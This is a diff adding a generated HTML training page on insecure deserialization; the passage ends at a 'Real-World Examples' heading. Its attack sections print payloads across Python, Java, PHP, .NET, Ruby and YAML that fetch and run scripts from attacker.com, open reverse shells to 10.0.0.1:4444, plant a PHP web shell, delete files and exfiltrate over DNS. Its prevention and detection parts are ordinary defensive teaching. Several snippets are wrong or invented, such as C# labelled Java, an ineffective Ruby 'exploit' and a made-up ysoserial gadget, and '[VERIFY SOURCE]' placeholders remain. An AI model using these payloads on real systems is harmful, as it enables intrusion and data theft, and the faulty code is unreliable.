@@ -1,0 +1,1268 @@
+<!-- GENERATED: follow sql-injection-learn-more.html template. Created by copilot script. -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Insecure Deserialization - Comprehensive Guide</title>
+    <link rel="stylesheet" href="../../src/web-assets/dashboard.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-okaidia.min.css">
+    <style>
+        .learn-container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        
+        .back-nav {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 12px 24px;
+            margin-bottom: 30px;
+            color: var(--primary-color);
+            text-decoration: none;
+            border: 1px solid var(--border-color);
+            border-radius: 5px;
+            transition: all 0.3s;
+            font-weight: 600;
+        }
+        
+        .back-nav:hover {
+            background-color: rgba(0, 255, 65, 0.1);
+            border-color: var(--primary-color);
+            box-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
+        }
+        
+        .page-header {
+            text-align: center;
+            padding: 60px 20px;
+            background: linear-gradient(135deg, rgba(0, 255, 65, 0.1), rgba(13, 255, 146, 0.05));
+            border-radius: 12px;
+            margin-bottom: 50px;
+            border: 2px solid var(--primary-color);
+            box-shadow: 0 0 30px rgba(0, 255, 65, 0.2);
+        }
+        
+        .page-header h1 {
+            color: var(--primary-color);
+            font-size: 3rem;
+            margin-bottom: 15px;
+            text-shadow: 0 0 15px rgba(0, 255, 65, 0.5);
+        }
+        
+        .page-header p {
+            color: var(--text-secondary);
+            font-size: 1.3rem;
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .content-section {
+            background: var(--card-bg);
+            border-radius: 12px;
+            padding: 40px;
+            margin-bottom: 30px;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 2px 10px rgba(0, 255, 65, 0.1);
+        }
+        
+        .content-section:hover {
+            box-shadow: 0 4px 20px rgba(0, 255, 65, 0.15);
+        }
+        
+        .content-section h2 {
+            color: var(--primary-color);
+            font-size: 2rem;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid var(--primary-color);
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .content-section h2:before {
+            content: "▸";
+            color: var(--secondary-color);
+            font-size: 2.5rem;
+        }
+        
+        .content-section h3 {
+            color: var(--secondary-color);
+            font-size: 1.5rem;
+            margin-top: 30px;
+            margin-bottom: 15px;
+        }
+        
+        .content-section h4 {
+            color: var(--primary-color);
+            font-size: 1.2rem;
+            margin-top: 25px;
+            margin-bottom: 12px;
+        }
+        
+        .content-section p {
+            color: var(--text-color);
+            line-height: 1.8;
+            margin-bottom: 15px;
+        }
+        
+        .content-section ul, .content-section ol {
+            margin-left: 25px;
+            margin-bottom: 20px;
+            color: var(--text-color);
+        }
+        
+        .content-section li {
+            margin-bottom: 12px;
+            line-height: 1.7;
+        }
+        
+        .content-section li strong {
+            color: var(--secondary-color);
+        }
+        
+        .content-section code {
+            background: rgba(0, 0, 0, 0.4);
+            padding: 3px 8px;
+            border-radius: 4px;
+            color: var(--primary-color);
+            font-family: 'Courier New', 'Consolas', monospace;
+            font-size: 0.9em;
+            border: 1px solid var(--border-color);
+        }
+        
+        .content-section pre {
+            background: rgba(0, 0, 0, 0.6);
+            padding: 25px;
+            border-radius: 8px;
+            overflow-x: auto;
+            margin: 25px 0;
+            border: 1px solid var(--primary-color);
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.2);
+        }
+        
+        .content-section pre code {
+            background: none;
+            padding: 0;
+            border: none;
+            color: var(--text-color);
+            font-size: 0.95em;
+        }
+        
+        .content-section a {
+            color: var(--secondary-color);
+            text-decoration: none;
+            border-bottom: 1px dashed var(--secondary-color);
+            transition: all 0.3s;
+        }
+        
+        .content-section a:hover {
+            color: var(--primary-color);
+            border-bottom-color: var(--primary-color);
+        }
+        
+        .content-section strong {
+            color: var(--secondary-color);
+            font-weight: 600;
+        }
+        
+        .warning-box {
+            background: rgba(255, 49, 49, 0.1);
+            border-left: 4px solid #ff3131;
+            padding: 20px;
+            margin: 25px 0;
+            border-radius: 4px;
+        }
+        
+        .warning-box h4 {
+            color: #ff3131;
+            margin-top: 0;
+        }
+        
+        .success-box {
+            background: rgba(0, 255, 65, 0.1);
+            border-left: 4px solid var(--primary-color);
+            padding: 20px;
+            margin: 25px 0;
+            border-radius: 4px;
+        }
+        
+        .success-box h4 {
+            color: var(--primary-color);
+            margin-top: 0;
+        }
+        
+        .toc {
+            background: rgba(0, 255, 65, 0.05);
+            border: 2px solid var(--primary-color);
+            border-radius: 12px;
+            padding: 30px;
+            margin-bottom: 40px;
+        }
+        
+        .toc h3 {
+            color: var(--primary-color);
+            margin-top: 0;
+            margin-bottom: 20px;
+            font-size: 1.5rem;
+        }
+        
+        .toc ul {
+            list-style: none;
+            margin-left: 0;
+        }
+        
+        .toc li {
+            margin-bottom: 10px;
+        }
+        
+        .toc a {
+            color: var(--text-color);
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 8px;
+            border-radius: 4px;
+            transition: all 0.3s;
+        }
+        
+        .toc a:hover {
+            background: rgba(0, 255, 65, 0.1);
+            color: var(--primary-color);
+            padding-left: 15px;
+        }
+        
+        .toc a:before {
+            content: "→";
+            color: var(--primary-color);
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="learn-container">
+        <a href="../index.html" class="back-nav">
+            <i class="fas fa-arrow-left"></i> Back to Attack Flows
+        </a>
+        
+        <div class="page-header">
+            <h1><i class="fas fa-cube"></i> Insecure Deserialization - Comprehensive Guide</h1>
+            <p>Complete guide to understanding, exploiting, and preventing insecure deserialization attacks</p>
+        </div>
+        
+        <div class="toc">
+            <h3><i class="fas fa-list"></i> Table of Contents</h3>
+            <ul>
+                <li><a href="#section-0">What is Insecure Deserialization?</a></li>
+                <li><a href="#section-1">How Insecure Deserialization Works</a></li>
+                <li><a href="#section-2">Advanced Attack Techniques</a></li>
+                <li><a href="#section-3">Defense Bypass Strategies</a></li>
+                <li><a href="#section-4">Prevention & Mitigation</a></li>
+                <li><a href="#section-5">Detection & Testing</a></li>
+                <li><a href="#section-6">Real-World Examples</a></li>
+                <li><a href="#section-7">Quick Reference</a></li>
+            </ul>
+        </div>
+        
+        <div class="content-section" id="section-0">
+            <h2>What is Insecure Deserialization?</h2>
+
+<p>Insecure Deserialization is a vulnerability that occurs when an application deserializes (reconstructs objects from byte streams) untrusted data without proper validation. This can allow attackers to manipulate serialized objects to execute arbitrary code, perform injection attacks, or abuse application logic. When exploited, deserialization flaws can enable:</p>
+
+<ul>
+    <li><strong>Remote Code Execution (RCE):</strong> Execute arbitrary commands on the server</li>
+    <li><strong>Authentication bypass:</strong> Manipulate session tokens or user roles</li>
+    <li><strong>Privilege escalation:</strong> Elevate user permissions by modifying serialized objects</li>
+    <li><strong>Denial of Service (DoS):</strong> Crash applications with malformed objects</li>
+    <li><strong>Data tampering:</strong> Modify application state or business logic</li>
+    <li><strong>SQL Injection / XXE:</strong> Inject payloads via deserialized properties</li>
+</ul>
+
+<h3>Why is it Critical?</h3>
+<p>Insecure Deserialization is ranked #8 in the OWASP Top 10 (2017) and merged into A08:2021 – Software and Data Integrity Failures. It's critical because:</p>
+
+<ul>
+    <li>Often leads to <strong>Remote Code Execution</strong> – the most severe impact</li>
+    <li>Difficult to detect with traditional security scanners</li>
+    <li>Exploitable in <strong>Java, PHP, Python, Ruby, .NET</strong> and other platforms</li>
+    <li>Can bypass authentication and authorization controls</li>
+    <li>Found in <strong>session management, caching, API tokens</strong>, and data storage</li>
+    <li>Exploitation often requires minimal user interaction</li>
+</ul>
+
+<h3>Common Serialization Formats</h3>
+<ul>
+    <li><strong>Java:</strong> Native serialization (ObjectInputStream), XML, JSON</li>
+    <li><strong>Python:</strong> pickle, PyYAML, shelve</li>
+    <li><strong>PHP:</strong> serialize()/unserialize(), __wakeup(), __destruct()</li>
+    <li><strong>.NET:</strong> BinaryFormatter, SoapFormatter, XmlSerializer</li>
+    <li><strong>Ruby:</strong> Marshal.load(), YAML.load()</li>
+</ul>
+
+        </div>
+        
+        <div class="content-section" id="section-1">
+            <h2>How Insecure Deserialization Works</h2>
+
+<h3>The Serialization/Deserialization Process</h3>
+<p>Serialization converts objects into a byte stream for storage or transmission. Deserialization reverses this process:</p>
+
+<pre><code class="language-python"># Python example - VULNERABLE
+import pickle
+
+# Serialization: Object → Bytes
+user = {'username': 'admin', 'role': 'user'}
+serialized = pickle.dumps(user)
+# b'\x80\x04\x95&\x00\x00\x00...'
+
+# Deserialization: Bytes → Object
+user_obj = pickle.loads(serialized)  # DANGEROUS if data is untrusted!
+</code></pre>
+
+<h3>The Vulnerability Pattern</h3>
+<p>The vulnerability occurs when applications deserialize untrusted data:</p>
+
+<pre><code class="language-java">// VULNERABLE JAVA CODE
+// Reading serialized object from user input
+ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
+Object obj = ois.readObject();  // DANGEROUS! User controls this data
+</code></pre>
+
+<h3>The Attack</h3>
+<p>An attacker crafts a malicious serialized object that exploits deserialization:</p>
+
+<pre><code class="language-python"># Attacker creates malicious pickle payload
+import pickle
+import os
+
+class Exploit:
+    def __reduce__(self):
+        # This executes during deserialization!
+        return (os.system, ('rm -rf /tmp/important_data',))
+
+malicious_data = pickle.dumps(Exploit())
+
+# When victim deserializes this:
+pickle.loads(malicious_data)  # ⚠️ Command executed!
+</code></pre>
+
+<h3>Attack Flow</h3>
+<ol>
+    <li><strong>Discovery:</strong> Attacker identifies deserialization in cookies, tokens, or parameters</li>
+    <li><strong>Analysis:</strong> Determines serialization format and target platform</li>
+    <li><strong>Gadget Chain Construction:</strong> Chains together existing classes to achieve code execution</li>
+    <li><strong>Payload Creation:</strong> Serializes malicious object with exploit chain</li>
+    <li><strong>Injection:</strong> Replaces legitimate serialized data with malicious payload</li>
+    <li><strong>Execution:</strong> Application deserializes and executes attacker's code</li>
+</ol>
+
+<h3>Magic Methods Exploited</h3>
+<p>Many languages have special methods called during deserialization:</p>
+
+<ul>
+    <li><strong>PHP:</strong> __wakeup(), __destruct(), __toString(), __call()</li>
+    <li><strong>Python:</strong> __reduce__(), __setstate__(), __reduce_ex__()</li>
+    <li><strong>Java:</strong> readObject(), readResolve(), readExternal()</li>
+    <li><strong>.NET:</strong> OnDeserialization(), ISerializable interface</li>
+    <li><strong>Ruby:</strong> marshal_load(), _load()</li>
+</ul>
+
+        </div>
+        
+        <div class="content-section" id="section-2">
+            <h2>Advanced Attack Techniques</h2>
+
+<h3>1. Java Deserialization with Gadget Chains</h3>
+<p>Java exploitation uses "gadget chains" - sequences of existing classes that can be chained together to execute code:</p>
+
+<pre><code class="language-java">// Example vulnerable class
+public class User implements Serializable {
+    private String username;
+    private Runtime runtime;
+    
+    private void readObject(ObjectInputStream in) {
+        // Custom deserialization - DANGEROUS!
+        in.defaultReadObject();
+        // Attacker can set runtime object
+        runtime.exec(someCommand); // Code execution!
+    }
+}
+</code></pre>
+
+<h4>Using ysoserial</h4>
+<p>ysoserial generates exploit payloads for Java deserialization [VERIFY SOURCE]:</p>
+
+<pre><code class="language-bash"># Generate CommonsCollections payload
+java -jar ysoserial.jar CommonsCollections1 "calc.exe" | base64
+
+# Apache Commons Collections exploit
+java -jar ysoserial.jar CommonsCollections6 "wget http://attacker.com/shell.sh -O /tmp/s.sh"
+
+# Spring Framework exploit
+java -jar ysoserial.jar Spring1 "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"
+
+# JSON-based (Jackson)
+java -jar ysoserial.jar JacksonRCE "rm -rf /tmp/*"
+</code></pre>
+
+<h3>2. Python Pickle Exploitation</h3>
+<pre><code class="language-python"># Remote Code Execution via pickle
+import pickle
+import base64
+
+class RCE:
+    def __reduce__(self):
+        import os
+        return (os.system, ('curl http://attacker.com/shell.sh | bash',))
+
+# Generate payload
+payload = pickle.dumps(RCE())
+encoded = base64.b64encode(payload)
+print(encoded)
+
+# More sophisticated - reverse shell
+class RevShell:
+    def __reduce__(self):
+        import subprocess
+        cmd = 'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'10.0.0.1\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/bash\',\'-i\'])"'
+        return (subprocess.Popen, (cmd,))
+</code></pre>
+
+<h3>3. PHP Object Injection</h3>
+<pre><code class="language-php">// VULNERABLE PHP CODE
+&lt;?php
+class Logger {
+    public $logFile = '/tmp/log.txt';
+    public $data;
+    
+    function __destruct() {
+        // Called when object is destroyed - DANGEROUS!
+        file_put_contents($this->logFile, $this->data);
+    }
+}
+
+// Vulnerable deserialization
+$user_data = unserialize($_COOKIE['user']);
+?&gt;
+
+&lt;!-- Attacker payload --&gt;
+&lt;?php
+// Create malicious object
+$exploit = new Logger();
+$exploit->logFile = '/var/www/html/shell.php';
+$exploit->data = '&lt;?php system($_GET["cmd"]); ?&gt;';
+
+// Serialize and use as cookie
+$payload = serialize($exploit);
+// O:6:"Logger":2:{s:7:"logFile";s:27:"/var/www/html/shell.php";s:4:"data";s:30:"&lt;?php system($_GET["cmd"]); ?&gt;";}
+?&gt;
+</code></pre>
+
+<h3>4. .NET BinaryFormatter Exploitation</h3>
+<pre><code class="language-csharp">// VULNERABLE C# CODE
+using System.IO;
+using System.Runtime.Serialization.Formatters.Binary;
+
+BinaryFormatter formatter = new BinaryFormatter();
+object obj = formatter.Deserialize(untrustedStream); // DANGEROUS!
+
+// Exploitation with ysoserial.net
+// ysoserial.net -f BinaryFormatter -g WindowsIdentity -c "calc.exe"
+</code></pre>
+
+<h3>5. Ruby Marshal Exploitation</h3>
+<pre><code class="language-ruby"># VULNERABLE Ruby code
+user_data = Marshal.load(params[:data])  # DANGEROUS!
+
+# Exploit - Remote Code Execution
+payload = Marshal.dump(`whoami`)
+
+# Advanced - using ERB template injection
+require 'erb'
+class Exploit
+  def initialize
+    ERB.new("&lt;%= `ls -la /` %&gt;").result
+  end
+end
+Marshal.dump(Exploit.new)
+</code></pre>
+
+<h3>6. YAML Deserialization</h3>
+<pre><code class="language-python"># Python PyYAML - VULNERABLE
+import yaml
+
+# UNSAFE deserialization
+data = yaml.load(user_input)  # Allows arbitrary Python objects!
+
+# Exploit payload
+exploit = """
+!!python/object/apply:os.system
+args: ['curl http://attacker.com/shell | sh']
+"""
+
+# Safe alternative
+data = yaml.safe_load(user_input)  # Only basic Python objects
+</code></pre>
+
+<h3>7. Gadget Chain Discovery</h3>
+<p>Finding exploitable classes in the application's classpath:</p>
+
+<pre><code class="language-bash"># Java - search for readObject methods
+find . -name "*.jar" -exec unzip -l {} \; | grep -i "readobject"
+
+# Analyze dependencies
+mvn dependency:tree | grep -i "commons-collections"
+
+# Look for dangerous libraries
+# - Apache Commons Collections (versions &lt; 3.2.2)
+# - Spring Framework (certain versions)
+# - Apache Groovy
+# - XStream
+</code></pre>
+
+        </div>
+        
+        <div class="content-section" id="section-3">
+            <h2>Defense Bypass Strategies</h2>
+
+<h3>Bypassing Signature Verification</h3>
+
+<h4>1. Algorithm Confusion</h4>
+<pre><code class="language-python"># If signature verification is weak
+# Original: HMAC-SHA256(data + secret)
+# Attacker tries to change algorithm to "none"
+
+import jwt
+payload = {'user': 'admin', 'role': 'admin'}
+# Try unsigned JWT
+token = jwt.encode(payload, None, algorithm='none')
+</code></pre>
+
+<h4>2. Type Confusion</h4>
+<pre><code class="language-java">// Exploit Java type handling
+// If whitelist checks class name as String
+"java.lang.Runtime".getClass()  // Might bypass string comparison
+</code></pre>
+
+<h3>Bypassing Class Whitelisting</h3>
+
+<h4>1. Inheritance Exploitation</h4>
+<pre><code class="language-java">// If only ArrayList is whitelisted
+// But attacker can use subclass that wasn't blacklisted
+class MaliciousArrayList extends ArrayList {
+    private void readObject(ObjectInputStream in) {
+        // Malicious code here
+    }
+}
+</code></pre>
+
+<h4>2. Proxy Classes</h4>
+<pre><code class="language-java">// Use Java Proxy to wrap malicious invocation handler
+import java.lang.reflect.Proxy;
+import java.lang.reflect.InvocationHandler;
+
+// Create proxy that executes code on method invocation
+Proxy.newProxyInstance(...)
+</code></pre>
+
+<h3>Bypassing Input Validation</h3>
+
+<h4>1. Encoding Tricks</h4>
+<pre><code># Base64 encoding
+echo "malicious_pickle_payload" | base64
+
+# Double encoding
+# URL encode → Base64 → Send
+
+# Compression
+import zlib
+compressed = zlib.compress(pickle_payload)
+</code></pre>
+
+<h4>2. Format Confusion</h4>
+<pre><code class="language-php">// PHP - switching between serialization formats
+// If JSON is checked but serialize() is used:
+$json_data = json_decode($input);
+$php_obj = unserialize($json_data['nested_field']); // Still vulnerable!
+</code></pre>
+
+<h3>Bypassing WAF/IDS</h3>
+
+<h4>1. Fragmentation</h4>
+<pre><code>// Split malicious payload across multiple requests
+// Send partial serialized object, complete on server
+</code></pre>
+
+<h4>2. Polymorphic Payloads</h4>
+<pre><code class="language-python"># Generate different serialized forms of same attack
+# Each time payload is different but achieves same result
+
+import pickle
+import random
+
+class PolyExploit:
+    def __reduce__(self):
+        # Add random junk that doesn't affect execution
+        junk = random.randint(1, 10000)
+        return (os.system, (f'id # {junk}',))
+</code></pre>
+
+<h3>Bypassing Deserialization Filters</h3>
+
+<h4>1. Nested Objects</h4>
+<pre><code class="language-java">// Hide malicious object inside legitimate wrapper
+class LegitimateClass implements Serializable {
+    private SafeObject safe;
+    private Object hidden; // Actually contains exploit chain
+}
+</code></pre>
+
+<h4>2. Late Binding</h4>
+<pre><code class="language-python"># Execute code after deserialization completes
+class DelayedExploit:
+    def __init__(self):
+        self.cmd = "whoami"
+    
+    def __getstate__(self):
+        return {'cmd': self.cmd}
+    
+    def __setstate__(self, state):
+        # Deserialization happens here
+        import subprocess
+        subprocess.call(state['cmd'], shell=True)
+</code></pre>
+
+        </div>
+        
+        <div class="content-section" id="section-4">
+            <h2>Prevention & Mitigation</h2>
+
+<h3>1. Avoid Deserializing Untrusted Data</h3>
+<p>✅ <strong>THE PRIMARY DEFENSE</strong></p>
+
+<div class="success-box">
+    <h4>Best Practice</h4>
+    <p>Never deserialize data from untrusted sources. If possible, use alternative data formats that don't support object instantiation.</p>
+</div>
+
+<pre><code class="language-python"># ❌ DANGEROUS - Native serialization
+import pickle
+user = pickle.loads(untrusted_data)
+
+# ✅ SAFE - Use JSON instead
+import json
+user = json.loads(untrusted_data)  # Only basic types, no code execution
+</code></pre>
+
+<h3>2. Use Safe Serialization Formats</h3>
+<p>Prefer data-only formats that don't support arbitrary object instantiation:</p>
+
+<ul>
+    <li><strong>✅ JSON:</strong> Data only, no code execution (use with care in JavaScript)</li>
+    <li><strong>✅ YAML (safe_load):</strong> Python yaml.safe_load() restricts to basic types</li>
+    <li><strong>✅ Protocol Buffers:</strong> Schema-based, type-safe</li>
+    <li><strong>✅ MessagePack:</strong> Efficient binary format, data-only</li>
+    <li><strong>❌ Pickle (Python):</strong> Arbitrary code execution</li>
+    <li><strong>❌ Native Java serialization:</strong> Gadget chain attacks</li>
+    <li><strong>❌ PHP serialize:</strong> Object injection</li>
+</ul>
+
+<h3>3. Implement Integrity Checks</h3>
+<p>Sign serialized data to detect tampering:</p>
+
+<pre><code class="language-python"># Python - HMAC signature
+import hmac
+import hashlib
+import json
+
+SECRET_KEY = b'your-secret-key-here'
+
+def serialize_safe(data):
+    json_data = json.dumps(data)
+    signature = hmac.new(SECRET_KEY, json_data.encode(), hashlib.sha256).hexdigest()
+    return json_data + '.' + signature
+
+def deserialize_safe(signed_data):
+    try:
+        data, signature = signed_data.rsplit('.', 1)
+        expected_sig = hmac.new(SECRET_KEY, data.encode(), hashlib.sha256).hexdigest()
+        
+        if not hmac.compare_digest(signature, expected_sig):
+            raise ValueError("Invalid signature")
+        
+        return json.loads(data)
+    except Exception as e:
+        raise ValueError("Deserialization failed")
+</code></pre>
+
+<pre><code class="language-java">// Java - HMAC validation
+import javax.crypto.Mac;
+import javax.crypto.spec.SecretKeySpec;
+
+public class SafeSerializer {
+    private static final String SECRET = "your-secret-key";
+    
+    public static String sign(String data) throws Exception {
+        Mac mac = Mac.getInstance("HmacSHA256");
+        SecretKeySpec key = new SecretKeySpec(SECRET.getBytes(), "HmacSHA256");
+        mac.init(key);
+        byte[] signature = mac.doFinal(data.getBytes());
+        return data + "." + Base64.getEncoder().encodeToString(signature);
+    }
+    
+    public static String verify(String signedData) throws Exception {
+        String[] parts = signedData.split("\\.");
+        if (parts.length != 2) throw new SecurityException("Invalid format");
+        
+        String data = parts[0];
+        String signature = parts[1];
+        
+        // Verify signature
+        String expectedSig = sign(data).split("\\.")[1];
+        if (!MessageDigest.isEqual(signature.getBytes(), expectedSig.getBytes())) {
+            throw new SecurityException("Invalid signature");
+        }
+        return data;
+    }
+}
+</code></pre>
+
+<h3>4. Use Type Whitelisting</h3>
+<p>Restrict deserialization to known safe classes:</p>
+
+<pre><code class="language-java">// Java - Custom ObjectInputStream with whitelist
+import java.io.ObjectInputStream;
+
+public class SecureObjectInputStream extends ObjectInputStream {
+    private static final Set&lt;String&gt; WHITELIST = Set.of(
+        "com.example.SafeClass1",
+        "com.example.SafeClass2",
+        "java.lang.String",
+        "java.util.ArrayList"
+    );
+    
+    @Override
+    protected Class&lt;?&gt; resolveClass(ObjectStreamClass desc) 
+            throws IOException, ClassNotFoundException {
+        
+        if (!WHITELIST.contains(desc.getName())) {
+            throw new InvalidClassException("Unauthorized class", desc.getName());
+        }
+        
+        return super.resolveClass(desc);
+    }
+}
+</code></pre>
+
+<pre><code class="language-python"># Python - Restricted unpickler
+import pickle
+import io
+
+class RestrictedUnpickler(pickle.Unpickler):
+    ALLOWED_CLASSES = {
+        ('__builtin__', 'dict'),
+        ('__builtin__', 'list'),
+        ('__builtin__', 'str'),
+        ('myapp.models', 'SafeUser'),
+    }
+    
+    def find_class(self, module, name):
+        if (module, name) not in self.ALLOWED_CLASSES:
+            raise pickle.UnpicklingError(f"Class {module}.{name} not allowed")
+        return super().find_class(module, name)
+
+def safe_loads(data):
+    return RestrictedUnpickler(io.BytesIO(data)).load()
+</code></pre>
+
+<h3>5. Isolate Deserialization</h3>
+<p>Run deserialization in sandboxed environments:</p>
+
+<ul>
+    <li><strong>Containers:</strong> Docker with limited privileges</li>
+    <li><strong>VMs:</strong> Separate virtual machines for untrusted operations</li>
+    <li><strong>Security Manager:</strong> Java Security Manager (being deprecated, use alternatives)</li>
+    <li><strong>Process isolation:</strong> Separate processes with minimal permissions</li>
+</ul>
+
+<h3>6. Use Modern Secure Alternatives</h3>
+
+<pre><code class="language-java">// Java - Replace BinaryFormatter
+// ❌ DANGEROUS
+BinaryFormatter formatter = new BinaryFormatter();
+object obj = formatter.Deserialize(stream);
+
+// ✅ SAFE - Use JSON
+using System.Text.Json;
+var options = new JsonSerializerOptions { /* configure */ };
+MyObject obj = JsonSerializer.Deserialize&lt;MyObject&gt;(json, options);
+</code></pre>
+
+<pre><code class="language-python"># Python - Avoid pickle for untrusted data
+# ❌ DANGEROUS
+import pickle
+data = pickle.loads(untrusted_input)
+
+# ✅ SAFE - Use JSON or MessagePack
+import json
+data = json.loads(untrusted_input)
+
+# or
+import msgpack
+data = msgpack.unpackb(untrusted_input)
+</code></pre>
+
+<h3>7. Monitor and Log Deserialization</h3>
+<pre><code class="language-python">import logging
+
+def deserialize_with_logging(data, source):
+    logger = logging.getLogger('deserialization')
+    logger.info(f"Deserialization attempt from {source}")
+    
+    try:
+        # Use safe deserialization
+        result = safe_deserialize(data)
+        logger.info(f"Successful deserialization: {type(result)}")
+        return result
+    except Exception as e:
+        logger.error(f"Deserialization failed: {e}")
+        raise
+</code></pre>
+
+<h3>8. Dependency Management</h3>
+<p>Remove or update vulnerable libraries:</p>
+
+<pre><code class="language-bash"># Java - Check for vulnerable dependencies
+mvn dependency:tree
+
+# Remove dangerous libraries if not needed
+# - commons-collections &lt; 3.2.2
+# - commons-beanutils
+# - groovy
+# - XStream &lt; 1.4.17
+
+# Python - Update PyYAML
+pip install 'PyYAML&gt;=5.4'
+
+# Use tools like OWASP Dependency-Check
+dependency-check --project MyApp --scan /path/to/libs
+</code></pre>
+
+<h3>9. Content Type Validation</h3>
+<pre><code class="language-python"># Validate content type before deserialization
+def safe_deserialize(data, expected_type):
+    result = json.loads(data)
+    
+    # Type validation
+    if not isinstance(result, expected_type):
+        raise TypeError(f"Expected {expected_type}, got {type(result)}")
+    
+    # Schema validation
+    validate_schema(result)
+    
+    return result
+</code></pre>
+
+        </div>
+        
+        <div class="content-section" id="section-5">
+            <h2>Detection & Testing</h2>
+
+<h3>Manual Testing Techniques</h3>
+
+<h4>1. Identifying Serialized Data</h4>
+<p>Look for these patterns in cookies, parameters, and API requests:</p>
+
+<pre><code># Java serialized objects (Base64 encoded)
+rO0AB...  (starts with 'rO0' in base64, 0xACED0005 in hex)
+
+# PHP serialized
+O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
+a:2:{i:0;s:5:"value";i:1;s:5:"value";}
+
+# Python pickle (Base64)
+gASV...
+KFN0c...
+
+# .NET BinaryFormatter
+AAEAAAD...
+
+# Java JSON (look for @class, @type indicators)
+{"@class":"com.example.User","username":"admin"}
+</code></pre>
+
+<h4>2. Basic Tampering Test</h4>
+<pre><code># Modify serialized data and observe behavior
+# Original cookie:
+O:4:"User":2:{s:4:"role";s:4:"user";}
+
+# Modified to admin:
+O:4:"User":2:{s:4:"role";s:5:"admin";}
+
+# If successful, access is escalated
+</code></pre>
+
+<h4>3. Exception Triggering</h4>
+<pre><code># Send malformed serialized data
+# Look for stack traces revealing:
+# - Deserialization libraries in use
+# - Class names
+# - File paths
+
+# Example: Corrupt the payload slightly
+rO0CORRUPT_DATA_HERE
+</code></pre>
+
+<h4>4. Out-of-Band Detection</h4>
+<pre><code class="language-python"># Python pickle - DNS exfiltration
+import pickle
+import os
+
+class DNSExfil:
+    def __reduce__(self):
+        return (os.system, ('nslookup vulnerable.attacker.com',))
+
+payload = pickle.dumps(DNSExfil())
+# Send payload, monitor DNS logs
+</code></pre>
+
+<h3>Automated Testing Tools</h3>
+
+<h4>ysoserial (Java)</h4>
+<p>Generate Java deserialization exploits [VERIFY SOURCE]:</p>
+
+<pre><code class="language-bash"># Installation
+git clone https://github.com/frohoff/ysoserial.git
+cd ysoserial
+mvn package
+
+# Generate payloads
+java -jar ysoserial-master.jar CommonsCollections1 "whoami" | base64
+
+# Test common gadget chains
+java -jar ysoserial-master.jar CommonsCollections1 calc.exe
+java -jar ysoserial-master.jar CommonsCollections6 calc.exe
+java -jar ysoserial-master.jar Spring1 calc.exe
+java -jar ysoserial-master.jar Jdk7u21 calc.exe
+
+# With Burp Intruder
+# Generate multiple payloads and test all gadget chains
+</code></pre>
+
+<h4>ysoserial.net (.NET)</h4>
+<pre><code class="language-bash"># Generate .NET payloads
+ysoserial.exe -f BinaryFormatter -g WindowsIdentity -c "calc.exe"
+ysoserial.exe -f SoapFormatter -g TypeConfuseDelegate -c "powershell.exe"
+ysoserial.exe -f ObjectStateFormatter -g PSObject -c "cmd /c whoami"
+</code></pre>
+
+<h4>phpggc (PHP)</h4>
+<pre><code class="language-bash"># PHP Generic Gadget Chains
+git clone https://github.com/ambionics/phpggc.git
+
+# Generate payload for Laravel
+./phpggc Laravel/RCE1 system id
+
+# Generate for Symfony
+./phpggc Symfony/RCE4 system whoami
+
+# Generate for Monolog
+./phpggc Monolog/RCE1 system "cat /etc/passwd"
+</code></pre>
+
+<h4>Burp Suite Extensions</h4>
+<ul>
+    <li><strong>Java Deserialization Scanner:</strong> Detects Java deserialization vulnerabilities</li>
+    <li><strong>Freddy:</strong> Deserialization bug finder</li>
+    <li><strong>GadgetProbe:</strong> Identifies gadget chains</li>
+</ul>
+
+<h3>Code Review Patterns</h3>
+<p>Search for vulnerable deserialization patterns:</p>
+
+<pre><code class="language-bash"># Python - dangerous pickle usage
+grep -r "pickle.loads" .
+grep -r "yaml.load" . | grep -v "safe_load"
+grep -r "marshal.load" .
+
+# Java - native deserialization
+grep -r "readObject" .
+grep -r "ObjectInputStream" .
+grep -r "XMLDecoder" .
+
+# PHP - unserialize
+grep -r "unserialize" .
+grep -r "__wakeup" .
+grep -r "__destruct" .
+
+# .NET - dangerous formatters
+grep -r "BinaryFormatter" .
+grep -r "SoapFormatter" .
+grep -r "ObjectStateFormatter" .
+
+# Ruby - Marshal/YAML
+grep -r "Marshal.load" .
+grep -r "YAML.load" .
+</code></pre>
+
+<h3>Runtime Detection</h3>
+<pre><code class="language-python"># Add monitoring to deserialization points
+import logging
+import pickle
+
+original_loads = pickle.loads
+
+def monitored_loads(data):
+    logging.warning(f"Pickle deserialization from: {inspect.stack()[1]}")
+    logging.warning(f"Data length: {len(data)}")
+    return original_loads(data)
+
+pickle.loads = monitored_loads
+</code></pre>
+
+<h3>SAST/DAST Tools</h3>
+<ul>
+    <li><strong>SonarQube:</strong> Detects insecure deserialization patterns</li>
+    <li><strong>Checkmarx:</strong> Static analysis for deserialization</li>
+    <li><strong>Fortify:</strong> Identifies unsafe deserialization</li>
+    <li><strong>Snyk:</strong> Dependency scanning for vulnerable libraries</li>
+    <li><strong>OWASP Dependency-Check:</strong> Identifies vulnerable components</li>
+</ul>
+
+        </div>
+        
+        <div class="content-section" id="section-6">
+            <h2>Real-World Examples</h2>
+
+<h3>Notable Breaches</h3>
+
+<h4>1. Apache Struts (Equifax Breach, 2017)</h4>
